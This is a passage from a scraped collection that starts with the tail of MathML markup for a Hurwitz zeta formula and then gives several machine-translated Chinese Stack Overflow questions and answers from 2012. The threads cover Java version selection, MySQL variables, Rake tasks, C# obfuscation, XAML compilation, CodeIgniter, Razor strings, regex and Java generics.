                <mrow id="p1.1.m1.1.15.1.8" xref="p1.1.m1.1.15.1.8.cmml">
                  <mrow id="p1.1.m1.1.15.1.8.1" xref="p1.1.m1.1.15.1.8.1.cmml">
                    <mo id="p1.1.m1.1.15.1.1" xref="p1.1.m1.1.15.1.1.cmml">-</mo>
                    <mrow id="p1.1.m1.1.15.1.8.1.1" xref="p1.1.m1.1.15.1.8.1.1.cmml">
                      <mn id="p1.1.m1.1.15.1.2" xref="p1.1.m1.1.15.1.2.cmml">2</mn>
                      <mo id="p1.1.m1.1.15.1.8.1.1.1" xref="p1.1.m1.1.15.1.8.1.1.1.cmml">⁢&lt;/mo>
                      <mi id="p1.1.m1.1.15.1.3" xref="p1.1.m1.1.15.1.3.cmml">k</mi>
                    </mrow>
                  </mrow>
                  <mo id="p1.1.m1.1.15.1.4" xref="p1.1.m1.1.15.1.4.cmml">-</mo>
                  <mi id="p1.1.m1.1.15.1.5" xref="p1.1.m1.1.15.1.5.cmml">s</mi>
                </mrow>
                <mo id="p1.1.m1.1.15.1.6" xref="p1.1.m1.1.15.1.6.cmml">+</mo>
                <mn id="p1.1.m1.1.15.1.7" xref="p1.1.m1.1.15.1.7.cmml">1</mn>
              </mrow>
            </msup>
          </mrow>
        </mrow>
        <mo id="p1.1.m1.1.6b" xref="p1.1.m1.1.6.cmml">+</mo>
        <mrow id="p1.1.m1.1.40.1.3" xref="p1.1.m1.1.40.1.3.cmml">
          <mstyle displaystyle="true" id="p1.1.m1.1.17" xref="p1.1.m1.1.17.cmml">
            <mfrac id="p1.1.m1.1.17a" xref="p1.1.m1.1.17.cmml">
              <mn id="p1.1.m1.1.17.2" xref="p1.1.m1.1.17.2.cmml">1</mn>
              <mrow id="p1.1.m1.1.17.3.1.8.2" xref="p1.1.m1.1.17.3.1.1.cmml">
                <mpadded width="-1.7pt" id="p1.1.m1.1.17.3.1.2" xref="p1.1.m1.1.17.3.1.1.cmml">
                  <mi mathvariant="normal" id="p1.1.m1.1.17.3.1.2.1.2" xref="p1.1.m1.1.17.3.1.2.1.1.cmml">Γ</mi>
                </mpadded>
                <mo id="p1.1.m1.1.17.3.1.8.2a" xref="p1.1.m1.1.17.3.1.1.cmml">⁡&lt;/mo>
                <mrow id="p1.1.m1.1.17.3.1.8.2.1" xref="p1.1.m1.1.17.3.1.1.cmml">
                  <mo id="p1.1.m1.1.17.3.1.5" xref="p1.1.m1.1.17.3.1.1.cmml">(</mo>
                  <mi id="p1.1.m1.1.17.3.1.6" xref="p1.1.m1.1.17.3.1.6.cmml">s</mi>
                  <mo id="p1.1.m1.1.17.3.1.7" xref="p1.1.m1.1.17.3.1.1.cmml">)</mo>
                </mrow>
              </mrow>
            </mfrac>
          </mstyle>
          <mo id="p1.1.m1.1.40.1.3.1" xref="p1.1.m1.1.40.1.3.1.cmml">⁢&lt;/mo>
          <mrow id="p1.1.m1.1.40.1.3.2" xref="p1.1.m1.1.40.1.3.2.cmml">
            <mstyle displaystyle="true" id="p1.1.m1.1.40.1.3.2.1" xref="p1.1.m1.1.40.1.3.2.1.cmml">
              <msubsup id="p1.1.m1.1.40.1.3.2.1a" xref="p1.1.m1.1.40.1.3.2.1.cmml">
                <mo largeop="true" symmetric="true" id="p1.1.m1.1.18" xref="p1.1.m1.1.18.cmml">∫&lt;/mo>
                <mn id="p1.1.m1.1.19.1" xref="p1.1.m1.1.19.1.cmml">0</mn>
                <mi mathvariant="normal" id="p1.1.m1.1.20.1" xref="p1.1.m1.1.20.1.cmml">∞&lt;/mi>
              </msubsup>
            </mstyle>
            <mrow id="p1.1.m1.1.40.1.3.2.2" xref="p1.1.m1.1.40.1.3.2.2.cmml">
              <mrow id="p1.1.m1.1.40.1.3.2.2.2" xref="p1.1.m1.1.40.1.3.2.2.2.2.cmml">
                <mo id="p1.1.m1.1.21" xref="p1.1.m1.1.40.1.3.2.2.2.2.cmml">(</mo>
                <mrow id="p1.1.m1.1.40.1.3.2.2.2.2" xref="p1.1.m1.1.40.1.3.2.2.2.2.cmml">
                  <mrow id="p1.1.m1.1.40.1.3.2.2.2.2.1" xref="p1.1.m1.1.40.1.3.2.2.2.2.1.cmml">
                    <mrow id="p1.1.m1.1.40.1.3.2.2.2.2.1.1" xref="p1.1.m1.1.40.1.3.2.2.2.2.1.1.cmml">
                      <mstyle displaystyle="true" id="p1.1.m1.1.22" xref="p1.1.m1.1.22.cmml">
                        <mfrac id="p1.1.m1.1.22a" xref="p1.1.m1.1.22.cmml">
                          <mn id="p1.1.m1.1.22.2" xref="p1.1.m1.1.22.2.cmml">1</mn>
                          <mrow id="p1.1.m1.1.22.3" xref="p1.1.m1.1.22.3.cmml">
                            <msup id="p1.1.m1.1.22.3.5" xref="p1.1.m1.1.22.3.5.cmml">
                              <mi mathvariant="normal" id="p1.1.m1.1.22.3.1" xref="p1.1.m1.1.22.3.1.cmml">e</mi>
                              <mi id="p1.1.m1.1.22.3.2.1" xref="p1.1.m1.1.22.3.2.1.cmml">x</mi>
                            </msup>
                            <mo id="p1.1.m1.1.22.3.3" xref="p1.1.m1.1.22.3.3.cmml">-</mo>
                            <mn id="p1.1.m1.1.22.3.4" xref="p1.1.m1.1.22.3.4.cmml">1</mn>
                          </mrow>
                        </mfrac>
                      </mstyle>
                      <mo id="p1.1.m1.1.23" xref="p1.1.m1.1.23.cmml">-</mo>
                      <mstyle displaystyle="true" id="p1.1.m1.1.24" xref="p1.1.m1.1.24.cmml">
                        <mfrac id="p1.1.m1.1.24a" xref="p1.1.m1.1.24.cmml">
                          <mn id="p1.1.m1.1.24.2" xref="p1.1.m1.1.24.2.cmml">1</mn>
                          <mi id="p1.1.m1.1.24.3" xref="p1.1.m1.1.24.3.cmml">x</mi>
                        </mfrac>
                      </mstyle>
                    </mrow>
                    <mo id="p1.1.m1.1.25" xref="p1.1.m1.1.25.cmml">+</mo>
                    <mstyle displaystyle="true" id="p1.1.m1.1.26" xref="p1.1.m1.1.26.cmml">
                      <mfrac id="p1.1.m1.1.26a" xref="p1.1.m1.1.26.cmml">
                        <mn id="p1.1.m1.1.26.2" xref="p1.1.m1.1.26.2.cmml">1</mn>
                        <mn id="p1.1.m1.1.26.3" xref="p1.1.m1.1.26.3.cmml">2</mn>
                      </mfrac>
                    </mstyle>
                  </mrow>
                  <mo id="p1.1.m1.1.27" xref="p1.1.m1.1.27.cmml">-</mo>
                  <mrow id="p1.1.m1.1.40.1.3.2.2.2.2.2" xref="p1.1.m1.1.40.1.3.2.2.2.2.2.cmml">
                    <mstyle displaystyle="true" id="p1.1.m1.1.40.1.3.2.2.2.2.2.1" xref="p1.1.m1.1.40.1.3.2.2.2.2.2.1.cmml">
                      <munderover id="p1.1.m1.1.40.1.3.2.2.2.2.2.1a" xref="p1.1.m1.1.40.1.3.2.2.2.2.2.1.cmml">
                        <mo largeop="true" movablelimits="false" symmetric="true" id="p1.1.m1.1.28" xref="p1.1.m1.1.28.cmml">∑&lt;/mo>
                        <mrow id="p1.1.m1.1.29.1" xref="p1.1.m1.1.29.1.cmml">
                          <mi id="p1.1.m1.1.29.1.1" xref="p1.1.m1.1.29.1.1.cmml">k</mi>
                          <mo id="p1.1.m1.1.29.1.2" xref="p1.1.m1.1.29.1.2.cmml">=</mo>
                          <mn id="p1.1.m1.1.29.1.3" xref="p1.1.m1.1.29.1.3.cmml">1</mn>
                        </mrow>
                        <mi id="p1.1.m1.1.30.1" xref="p1.1.m1.1.30.1.cmml">n</mi>
                      </munderover>
                    </mstyle>
                    <mrow id="p1.1.m1.1.40.1.3.2.2.2.2.2.2" xref="p1.1.m1.1.40.1.3.2.2.2.2.2.2.cmml">
                      <mstyle displaystyle="true" id="p1.1.m1.1.31" xref="p1.1.m1.1.31.cmml">
                        <mfrac id="p1.1.m1.1.31a" xref="p1.1.m1.1.31.cmml">
                          <msub id="p1.1.m1.1.31.2.1.5" xref="p1.1.m1.1.31.2.1.1.cmml">
                            <mi id="p1.1.m1.1.31.2.1.2" xref="p1.1.m1.1.31.2.1.1.1.cmml">B</mi>
                            <mrow id="p1.1.m1.1.31.2.1.3.1" xref="p1.1.m1.1.31.2.1.3.1.cmml">
                              <mn id="p1.1.m1.1.31.2.1.3.1.1.1" xref="p1.1.m1.1.31.2.1.3.1.1.1.cmml">2</mn>
                              <mo id="p1.1.m1.1.31.2.1.3.1.1.3" xref="p1.1.m1.1.31.2.1.3.1.1.3.cmml">⁢&lt;/mo>
                              <mi id="p1.1.m1.1.31.2.1.3.1.1.2" xref="p1.1.m1.1.31.2.1.3.1.1.2.cmml">k</mi>
                            </mrow>
                          </msub>
                          <mrow id="p1.1.m1.1.31.3" xref="p1.1.m1.1.31.3.cmml">
                            <mrow id="p1.1.m1.1.31.3.6" xref="p1.1.m1.1.31.3.6.2.cmml">
                              <mo stretchy="false" id="p1.1.m1.1.31.3.1" xref="p1.1.m1.1.31.3.6.2.cmml">(</mo>
                              <mrow id="p1.1.m1.1.31.3.6.2" xref="p1.1.m1.1.31.3.6.2.cmml">
                                <mn id="p1.1.m1.1.31.3.2" xref="p1.1.m1.1.31.3.2.cmml">2</mn>
                                <mo id="p1.1.m1.1.31.3.6.2.1" xref="p1.1.m1.1.31.3.6.2.1.cmml">⁢&lt;/mo>
                                <mi id="p1.1.m1.1.31.3.3" xref="p1.1.m1.1.31.3.3.cmml">k</mi>
                              </mrow>
                              <mo stretchy="false" id="p1.1.m1.1.31.3.4" xref="p1.1.m1.1.31.3.6.2.cmml">)</mo>
                            </mrow>
                            <mo lspace="0pt" rspace="3.5pt" id="p1.1.m1.1.31.3.5" xref="p1.1.m1.1.31.3.5.cmml">!</mo>
                          </mrow>
                        </mfrac>
                      </mstyle>
                      <mo id="p1.1.m1.1.40.1.3.2.2.2.2.2.2.1" xref="p1.1.m1.1.40.1.3.2.2.2.2.2.2.1.cmml">⁢&lt;/mo>
                      <msup id="p1.1.m1.1.40.1.3.2.2.2.2.2.2.2" xref="p1.1.m1.1.40.1.3.2.2.2.2.2.2.2.cmml">
                        <mi id="p1.1.m1.1.32" xref="p1.1.m1.1.32.cmml">x</mi>
                        <mrow id="p1.1.m1.1.33.1" xref="p1.1.m1.1.33.1.cmml">
                          <mrow id="p1.1.m1.1.33.1.5" xref="p1.1.m1.1.33.1.5.cmml">
                            <mn id="p1.1.m1.1.33.1.1" xref="p1.1.m1.1.33.1.1.cmml">2</mn>
                            <mo id="p1.1.m1.1.33.1.5.1" xref="p1.1.m1.1.33.1.5.1.cmml">⁢&lt;/mo>
                            <mi id="p1.1.m1.1.33.1.2" xref="p1.1.m1.1.33.1.2.cmml">k</mi>
                          </mrow>
                          <mo id="p1.1.m1.1.33.1.3" xref="p1.1.m1.1.33.1.3.cmml">-</mo>
                          <mn id="p1.1.m1.1.33.1.4" xref="p1.1.m1.1.33.1.4.cmml">1</mn>
                        </mrow>
                      </msup>
                    </mrow>
                  </mrow>
                </mrow>
                <mo id="p1.1.m1.1.34" xref="p1.1.m1.1.40.1.3.2.2.2.2.cmml">)</mo>
              </mrow>
              <mo id="p1.1.m1.1.40.1.3.2.2.1" xref="p1.1.m1.1.40.1.3.2.2.1.cmml">⁢&lt;/mo>
              <msup id="p1.1.m1.1.40.1.3.2.2.3" xref="p1.1.m1.1.40.1.3.2.2.3.cmml">
                <mi id="p1.1.m1.1.35" xref="p1.1.m1.1.35.cmml">x</mi>
                <mrow id="p1.1.m1.1.36.1" xref="p1.1.m1.1.36.1.cmml">
                  <mi id="p1.1.m1.1.36.1.1" xref="p1.1.m1.1.36.1.1.cmml">s</mi>
                  <mo id="p1.1.m1.1.36.1.2" xref="p1.1.m1.1.36.1.2.cmml">-</mo>
                  <mn id="p1.1.m1.1.36.1.3" xref="p1.1.m1.1.36.1.3.cmml">1</mn>
                </mrow>
              </msup>
              <mo id="p1.1.m1.1.40.1.3.2.2.1a" xref="p1.1.m1.1.40.1.3.2.2.1.cmml">⁢&lt;/mo>
              <msup id="p1.1.m1.1.40.1.3.2.2.4" xref="p1.1.m1.1.40.1.3.2.2.4.cmml">
                <mi mathvariant="normal" id="p1.1.m1.1.37" xref="p1.1.m1.1.37.cmml">e</mi>
                <mrow id="p1.1.m1.1.38.1" xref="p1.1.m1.1.38.1.cmml">
                  <mo id="p1.1.m1.1.38.1.1" xref="p1.1.m1.1.38.1.1.cmml">-</mo>
                  <mrow id="p1.1.m1.1.38.1.4" xref="p1.1.m1.1.38.1.4.cmml">
                    <mi id="p1.1.m1.1.38.1.2" xref="p1.1.m1.1.38.1.2.cmml">a</mi>
                    <mo id="p1.1.m1.1.38.1.4.1" xref="p1.1.m1.1.38.1.4.1.cmml">⁢&lt;/mo>
                    <mi id="p1.1.m1.1.38.1.3" xref="p1.1.m1.1.38.1.3.cmml">x</mi>
                  </mrow>
                </mrow>
              </msup>
              <mo id="p1.1.m1.1.40.1.3.2.2.1b" xref="p1.1.m1.1.40.1.3.2.2.1.cmml">⁢&lt;/mo>
              <mrow id="p1.1.m1.1.39.2" xref="p1.1.m1.1.39.1.cmml">
                <mo rspace="0.8pt" id="p1.1.m1.1.39.2.1" xref="p1.1.m1.1.39.1.1.cmml">d</mo>
                <mi id="p1.1.m1.1.39.2.2" xref="p1.1.m1.1.39.2.2.cmml">x</mi>
              </mrow>
            </mrow>
          </mrow>
        </mrow>
      </mrow>
    </mrow>
    <annotation encoding="application/x-tex" id="p1.1.m1.1c">{\displaystyle{\displaystyle{\displaystyle\HurwitzZeta@{s}{a}=\frac{1}{2}a^{-s%
}+\frac{a^{1-s}}{s-1}+\sum_{k=1}^{n}\frac{\EulerGamma@{s+2k-1}}{\EulerGamma@{s%
}}\frac{\BernoulliB{2k}}{(2k)!}a^{-2k-s+1}+\frac{1}{\EulerGamma@{s}}\int_{0}^{%
\infty}\left(\frac{1}{e^{x}-1}-\frac{1}{x}+\frac{1}{2}-\sum_{k=1}^{n}\frac{%
\BernoulliB{2k}}{(2k)!}x^{2k-1}\right)x^{s-1}e^{-ax}\diff{x}}}}</annotation>
  </semantics>
</math>
</body>

</html>
```

为了在 Firefox 中也实现换行，MathML 协会目前正在寻找[实现此功能](https://gitlab.com/mathml/browser-extensions/issues/1)的个人。

# java - Scientific Linux 上的 Java 设置显示两个不同的版本

> ID：13916179
> 
> 赞同：0
> 
> 时间：2012-12-17T14:38:08.713
> 
> 标签：java, linux, selinux

Scientific Linux 上的 Java 设置显示了两个不同的版本。

我正在尝试在 Scientific Linux 上正确设置 java。

如果我执行**javac -version**我会得到以下信息：**java_1.7.0_10**这是我真正想要使用的版本。

但是，如果我执行**java -version**，我会得到以下信息：

```
OpenJDK Runtime Environment (IcedTea6 1.11.5) (rhel-1.50.1.11.5.el6_3-x86_64)
OpenJDK 64-Bit Server VM (build 20.0-b12, mixed mode)** 
```

哪个不是我想运行的版本...有人可以告诉我如何解决这个问题..谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:44:16.167

如果您已经安装，请使用它来选择 java 替代方案。

```
 /usr/sbin/alternatives --config java 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:42:15.643

您应该检查您的 $PATH 环境变量。

键入`which javac`以查看 javac-binary 的位置。

例如：

```
which javac -> /usr/local/bin/javac 
```

然后执行：

```
export PATH=/usr/local/bin/:$PATH 
```

您能否发布以下输出：

`which java && which javac`

```
update-alternatives --list java 
```

# mysql - 选择列到变量中，以及其他列

> ID：13916182
> 
> 赞同：3
> 
> 时间：2012-12-17T14:38:20.817
> 
> 标签：mysql, stored-procedures

在 MYSQL 存储过程中，我需要选择两个表列，**并将**列选择到变量中，以便在该过程中进一步使用。

下面是存储过程的简化版本。

```
DECLARE pUSR_ID BIGINT;
DECLARE pPRJ_ID BIGINT;
DECLARE pUSR_LAN_ID BIGINT;

SELECT USR_ID, USR_Login, USR_Password, USR_Archived, USR_Deleted, 
  USR_ID, USR_PRJ_ID, USR_LAN_ID INTO pUSR_ID, pPRJ_ID, pUSR_LAN_ID
FROM tblUsers
WHERE USR_Login = 'foobar';
```

当我执行上述存储过程时，我收到以下错误消息，这是有道理的。

`Error Code: 1222\. The used SELECT statements have a different number of columns`

所以，我把变量放在第一位，其他列放在变量之后。

```
SELECT USR_ID, USR_PRJ_ID, USR_LAN_ID INTO pUSR_ID, pPRJ_ID, pUSR_LAN_ID,
  USR_ID, USR_Login, USR_Password, USR_FullName, USR_IsProjectAdmin, USR_Archived,
  USR_Deleted
```

执行此返回：`Error 1327: Undeclared variable: USR_ID`。我明白为什么我会收到错误。

我不明白的是如何在同一个语句中选择表列**并将**某些列选择到变量中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:59:13.880

```
/*
DECLARE pUSR_ID BIGINT;
DECLARE pPRJ_ID BIGINT;
DECLARE pUSR_LAN_ID BIGINT;
*/ /*no need to declare*/

SELECT 
@pUSR_ID:=USR_ID, 
USR_Login, 
USR_Password, 
USR_Archived, 
USR_Deleted, 
USR_ID, 
@pPRJ_ID:=USR_PRJ_ID, 
@pUSR_LAN_ID:=USR_LAN_ID 
FROM tblUsers
WHERE USR_Login = 'foobar'; 
```

# ruby-on-rails - 如何编写使用 args 运行多个任务的任务？

> ID：13916184
> 
> 赞同：1
> 
> 时间：2012-12-17T14:38:29.770
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3.1, rake, task

我想为每个模型运行任务，如下所示：

```
task all: :environment do
  resources = [ Question,
                Answer,
                Link,
                Event,
                PastEvent,
                Review ]
  resources.each do |resource|
    #Rake::Task["tire:import CLASS=#{resource} FORCE=true"].execute
    system "rake environment tire:import CLASS='#{resource}' FORCE=true"
  end
end 
```

有更好的使用方法`system`吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T16:54:24.343

您可以使用 `Rake::Task["<your_task>"].invoke(<params>)`.

例如：`Rake::Task["db:migrate"].invoke`。

`invoke`运行依赖项也不同于`execute`. 如果任务已经被调用，你需要使用`reenable`ie`Rake::Task["<your_task>"].reenable`

# c# - VS2010 - 仅在 C# 中构建解决方案时更改公共类名

> ID：13916187
> 
> 赞同：0
> 
> 时间：2012-12-17T14:38:42.173
> 
> 标签：c#, visual-studio-2010, class, plugins, obfuscation

> **可能重复：**
> [.NET 的免费混淆工具](https://stackoverflow.com/questions/805549/free-obfuscation-tools-for-net)

我有我的 C# 应用程序并且： 当我在“Just Decompiler”或任何反编译器中打开我的软件时 - 我可以看到表单/类的名称......以及我创建的任何公共类/对象。顺便说一句，我使用了混淆器。

很长一段时间以来，我一直在寻找可以更改我所有班级名称的软件/插件（包括公共班级 - 因为没有第 3 方应用程序会使用它）。

我正在寻找一个只会更改所有公共表单/类名称的插件，例如：我有一个名为“MyAlgos”的表单，我希望它只是重命名它->仅在我构建解决方案时-所以当我我正在编程，我会看到名称“MyAlgos”，但是在我在反编译器中打开我构建的软件程序集之后 - 我会看到它类似于 Dhd436bxSg ... :)

希望有类似的东西可以满足我的需要。谢谢！

[屏幕截图 http://s1.postimage.org/4jgxaubu7/image46.png](http://s1.postimage.org/4jgxaubu7/image46.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:41:24.373

[.NET 的 Crypto Obfuscator 可以](http://www.ssware.com/cryptoobfuscator/obfuscator-net.htm)做到这一点，但它不是免费的。[这里](https://stackoverflow.com/questions/805549/free-obfuscation-tools-for-net)列出了一些免费的混淆工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:48:47.003

如果购买一个像样的混淆器不是一种选择，让你的代码尽可能多地“私有”、“受保护”和“内部”，然后为其余部分制作空的公共包装器。不仅是类，还有方法和属性。混淆器使它们可见，因为“公共”意味着它们可能正在被其他程序集使用，并且它们需要能够找到他们需要的东西

# c# - XAML 的编译器参数？

> ID：13916188
> 
> 赞同：2
> 
> 时间：2012-12-17T14:38:44.673
> 
> 标签：c#, xaml, visual-studio-2012, baml

> **可能重复：**
> [XAML 条件编译](https://stackoverflow.com/questions/1213576/xaml-conditional-compilation)

在 C# 中，我可以在代码中执行以下操作。

```
#if COMPILING_AS_WINDOWS_PHONE_7
    //some random code
#else
    //some random code
#endif 
```

这使我可以通过使用项目的编译器参数来拥有多个以不同方式编译的项目。换句话说，我不必每次都重新发明轮子。

但是，如何使用 XAML 做到这一点？我似乎在网上找不到任何关于这个的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:45:25.853

您**无法**控制 XAML，因为**XAML 应始终在 .NET 中具有自动生成的代码**，这些代码将自动编译并忽略所有前处理器定义。

**您可以使用注释并使用<!-- -->**注释符号手动执行此操作

唯一可行的解​​决方案 - 将您的 XAML 定义完全转换为完全编码为 C# 类，因此使用**纯 C#**类转换为类控制库。或者，您可以使用托管 C++ 进行控件组合。

唯一的缺点是难以手动开发、维护、阅读和更改。优点是您可以使用 XAML 的代码生成工具之一。

最后，使用**#if #endif**，您可以使用一个代码库/代码源进行**windows phone** / **8**开发，但根据我的经验，**最好使用部分类**和**通用代码库**（您可以添加一个文件作为参考该项目）。

# php - 如何在 Codeigniter 上使用 $query->row 获取类对象

> ID：13916194
> 
> 赞同：5
> 
> 时间：2012-12-17T14:38:52.443
> 
> 标签：php, codeigniter, object, stdclass

我目前正在使用 Codeigniter 框架。在下面的代码中，我想获取一个`Animal_model`对象，而不是一个`stdClass`对象。

```
<?php
class Animal_model extends CI_Model{

    var $idanimal;
    var $name;
    public static $table = 'animals';

    function __construct() {
        parent::__construct();
    }

    function getone(self $animal){
        $query = $this->db->get_where(self::$table, array('id_animal' => $animal->idanimal));

        if($query == FALSE){
            return FALSE;
        }else{
            return $query->row(); // How to get an Animal_model object here? 
        }
    }
}

$lion = new Animal_model();
$lion->idanimal = 25; 
var_dump($lion); // It says "object(Animal_model)".

$lion = $lion->getone($lion);
var_dump($lion); // Now it says "object(stdClass)".

?> 
```

如何转换`$query->row()`为 Animal_model 对象？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-17T15:20:51.767

CodeIgniter 有内置的功能！

```
return $query->row(0, 'Animal_model'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:49:28.613

```
 if($query == FALSE){
        return FALSE;
    }else{
       // How to get an Animal_model object here? 
       $row = $query->row();

       $animal = new Animal_model();
       $animal->idanimal = $row->idanimal;
       $animal->name= $row->name;
       return $animal;
    } 
```

以上将做你想要的，但我认为这不是一个好主意。最好有第二个类，例如`Animal`不扩展任何可用于表示动物的模型。

```
class Animal
{
    public name = '';
    public id = 0;

    public function __construct($id, $name)
    {
        $this->id = $id;
        $this->name = $name;
    }
} 
```

在您的模型中，您可以创建 this 的实例并返回它们，而不是返回模型对象。

```
 if($query == FALSE){
        return FALSE;
    }else{
        $row = $query->row();
        return new Animal($row->idanimal, $row->name);
    } 
```

我还会将`getone`函数更改为采用 ID，并选择此 ID 匹配的位置：

```
function getone($id){ 
```

通过这种方式，您可以将模型用作动物的管理器，模型处理数据并返回 Animal 对象。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:48:20.037

你的第一个`var_dump($lion)`是 type `object(Animal_model)`。

然后用现在`$lion`的结果覆盖 的值，或者 的值，这将返回一个 object( )。`$lion->getone($lion);` `$lion``FALSE``$query->row()``stdClass`

`$query->row()`将**始终**返回一个数据库结果对象（一个`stdClass`对象）。

你的代码正在做它应该做的事情。

[http://ellislab.com/codeigniter/user-guide/database/results.html](http://ellislab.com/codeigniter/user-guide/database/results.html)

请问为什么你需要那个对象是 type 的`Animal_model`？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T14:52:21.880

而不是 return $query->row(); 您可以实例化 Animal_model 类的对象并将 $query->row() 中的值分配给对象的属性。但我不确定这样做有什么价值。您仍将获得相同的数据。Animal_Model 类中是否有需要在检索行后调用的方法？

侧边栏注释... 您可能希望避免使用“var”来描述您的属性。除非您能想到公共或私人的原因，否则您可能想使用“受保护”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-17T14:59:29.920

如果我理解你的问题；当您调用数据库表而不是单个列数据时，您想要一个自定义类对象（Animal_model 类型）对吗？

首先，当您调用 $query->row() 时，您不会检索 Animal_model 对象。您正在检索数据库行对象。您实际上必须从中提取单个数据实例：

```
 $row = $query->row(); 

   echo $row->title;
   echo $row->name;
   echo $row->body; 
```

因此，由于您设计类的方式，我建议您创建一个自定义静态函数，该函数将采用数据库行对象的实例并实例化一个新的 Animal_model 实例。或者采用数据库行对象的实例并填充所述对象的字段的方法。

# asp.net - 剃刀串操作

> ID：13916198
> 
> 赞同：3
> 
> 时间：2012-12-17T14:39:17.280
> 
> 标签：asp.net, razor

我有一根剃须刀绳

```
 @postername.Substring(0, @postername.IndexOf("@")) 
```

如果用户名有电子邮件，我会在 @ 符号之前得到用户名，但如果用户名没有电子邮件，我想要整个单词，怎么办？

```
 if(@postername.Contains("@")){
             @postername.Substring(0, @postername.IndexOf("@"))
            }else{
            @postername
            } 
```

但没有用，请帮忙

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-17T14:43:35.187

如果您必须在视图级别执行此操作，请先将逻辑构建到变量中：

```
@{

 string posternameShort = postername;

 if(postername.Contains("@")){
     posternameShort = postername.Substring(0, postername.IndexOf("@"))
 }

} 
```

然后调用新变量：

```
@posternameShort 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-17T15:13:45.893

为了进一步阐明这一点，Razor 函数（出现在 和 之间的代码块中`{`）`}`完全[支持 C# 代码](http://www.asp.net/web-pages/overview/getting-started/introducing-razor-syntax-%28c%29)。此外，[还支持 Visual Basic 代码](http://www.asp.net/web-pages/overview/getting-started/introducing-razor-syntax-%28vb%29)。

这很强大。在 C# 或 Visual Basic 中发生的任何字符串操作也可在 Razor 代码中使用。

更多信息可[在此处](http://blogs.msdn.com/b/timlee/archive/2010/07/30/using-functions-in-an-asp-net-page-with-razor-syntax.aspx)和[此处](http://dotnetslackers.com/articles/aspnet/Razor-Functions-and-Helpers.aspx#s3-functions-in-c)获得。

[Curt 的回复](https://stackoverflow.com/a/13916281/2658159)概述了执行此操作的基本方法，但我认为解释“如何”背后的“为什么”会很好，特别是因为我自己一直在研究如何使用 Razor 操作字符串。

# javascript - 电视剧集的Javascript正则表达式

> ID：13916200
> 
> 赞同：-3
> 
> 时间：2012-12-17T14:39:23.207
> 
> 标签：javascript, regex

我要做的是从这些不同的可能组合中匹配季节和剧集编号：

```
S01E05
S1E5
1x05
1x5 
```

我感兴趣的数据是每个季节的第 1 季和第 5 集。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T14:41:19.003

尝试以下表达式，它将捕获不带前导零的系列和剧集编号：

```
^S?0*(\d+)?[xE]0*(\d+) 
```

目前，检测被锚定到带有`^`字符的名称的开头。如果系列名称在字符串中的其他位置，请将其删除。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:43:14.667

这应该与启用多行修饰符的所有示例匹配：

```
^S?\d+[Ex]\d+$ 
```

缺点是它也会匹配：

```
S01x5 
```

如果这是不可接受的，您将需要上述正则表达式的变体来检测输入是否以`S`.

# java - 类型安全的通用集合构建器/容器

> ID：13916209
> 
> 赞同：4
> 
> 时间：2012-12-17T14:40:04.023
> 
> 标签：java, generics

在我的方法`readList`中，我想构建一个`java.util.List`用户定义的类型（具体的列表类型是一个参数）。我不想限制`readList`或`ArrayList`但是`LinkedList`；用户可能会提供他自己的`java.util.List`实现。如果可能，该方法还可能缓存列表，因此该方法需要返回列表。我尝试了几件事。在您看来，以下哪一项是“最佳”API，或者还有其他更好的 API？

以下编译，但我得到编译器警告：“类型安全：类型 ArrayList 的表达式需要未经检查的转换以符合 ArrayList”，所以这不是一个很好的解决方案：

```
void classParameter() {
    ArrayList<String> a = readList(ArrayList.class);
    LinkedList<String> b = readList(LinkedList.class);
}

<X, T extends List<X>> T readList(Class<T> clazz) {
    try {
        return clazz.newInstance();
    } catch (Exception e) {
        throw new RuntimeException(e);
    }
} 
```

以下编译，但我仍然收到编译器警告，而且它实际上并没有按预期工作：

```
void classTypeParameters() {
    ArrayList<String> a = readList(ArrayList.class, String.class);
    LinkedList<String> b = readList(LinkedList.class, Integer.class);
}

<T extends List<X>, X> T readList(Class<T> clazz, Class<X> type) {
    try {
        return clazz.newInstance();
    } catch (Exception e) {
        throw new RuntimeException(e);
    }
} 
```

以下作品，是我个人的最爱。它检查列表类型。有点危险的是有人可能会错误地忘记分配结果。这可以通过重命名`readList`来解决，`readListWithTemplate`使用返回值会更明显。它类似于`List.toArray(T[] a)`：

```
void template() {
    ArrayList<String> a = readList(new ArrayList<String>());
    LinkedList<String> b = readList(new LinkedList<String>());
    // wrong usage:
    List<String> c = new LinkedList<String>();
    readList(c);
}

@SuppressWarnings("unchecked")
<X, T extends List<X>> T readList(T template) {
    try {
        return (T) template.getClass().newInstance();
    } catch (Exception e) {
        throw new RuntimeException(e);
    }
} 
```

“超级令牌类型”也可以，但对于不熟悉这种模式的开发人员来说可能有点难以理解，并且在 Eclipse 中我收到警告“应该记录空块”，我想避免这种情况：

```
void superTypeToken() {
    ArrayList<String> a = readList(new ListType<ArrayList<String>>() {});
    LinkedList<String> b = readList(new ListType<LinkedList<String>>() {});
}

abstract static class ListType<X extends List<?>> {
    // super type token class
}

@SuppressWarnings("unchecked")
<X, T extends List<X>> T readList(ListType<T> t) {
    try {
        Type type = t.getClass().getGenericSuperclass();
        if (!(type instanceof ParameterizedType)) {
            throw new IllegalArgumentException("Missing type parameters");
        }
        ParameterizedType pt = (ParameterizedType) type;
        type = pt.getActualTypeArguments()[0];
        pt = (ParameterizedType) type;
        Class<?> listClass = (Class<?>) pt.getRawType();
        return (T) listClass.newInstance();
    } catch (Exception e) {
